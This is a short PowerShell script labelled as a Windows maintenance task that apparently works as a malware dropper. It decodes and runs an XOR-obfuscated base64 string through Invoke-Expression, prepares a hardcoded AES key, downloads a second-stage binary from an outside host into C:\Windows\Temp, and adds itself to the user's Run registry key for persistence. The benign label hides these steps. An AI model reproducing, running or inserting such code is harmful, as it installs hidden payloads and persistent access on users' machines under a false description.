# Windows maintenance task
$k = 0x3b
$enc = "bElST14Wc1RITxsZeGJ5dUBdUkNPTkleZFdeVUhkS1RMXklIU15XV0YZ"
$bytes = [System.Convert]::FromBase64String($enc)
$clear = -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })
Invoke-Expression $clear

$aes = New-Object System.Security.Cryptography.AesManaged
$aes.Key = [byte[]] @(0x1d, 0xc1, 0x34, 0xb6, 0x8a, 0x49, 0xf4, 0xe0, 0x5f, 0x13, 0x57, 0xea, 0x32, 0x7d, 0xdb, 0x57)
$aes.IV = [byte[]] @(0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f)
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://update.example.invalid/stage2.bin", "C:\Windows\Temp\s2.bin")
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value $PSCommandPath
